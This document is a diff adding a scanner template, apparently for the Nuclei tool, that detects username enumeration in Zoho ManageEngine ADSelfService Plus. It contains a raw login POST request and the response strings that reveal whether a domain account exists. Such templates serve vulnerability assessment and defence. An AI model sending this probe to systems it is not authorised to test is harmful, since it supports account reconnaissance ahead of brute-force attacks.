@@ -1,0 +1,30 @@
+id: zoho-adselfservice-username-enumeration
+info:
+  name: Zoho ManageEngine ADSelfService Plus Username Enumeration
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Zoho ManageEngine ADSelfService Plus is vulnerable to a username enumeration vulnerability in the /ServletAPI/accounts/login endpoint. Attackers can enumerate domain users registered to ADSelfService through brute force by observing the responses for different usernames.
+  reference:
+    - https://github.com/passtheticket/vulnerability-research/blob/main/manage-engine-apps/adselfservice-userenum.md
+    - https://www.manageengine.com/products/self-service-password/
+http:
+  - raw:
+      - |
+        POST /ServletAPI/accounts/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        loginName=Administrator
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "WELCOME_NAME"
+          - "LOGIN_STATUS"
+      - type: word
+        words:
+          - "eSTATUS:\"Your account has been disabled"
+      - type: word
+        words:
+          - "eSTATUS:\"Permission Denied"
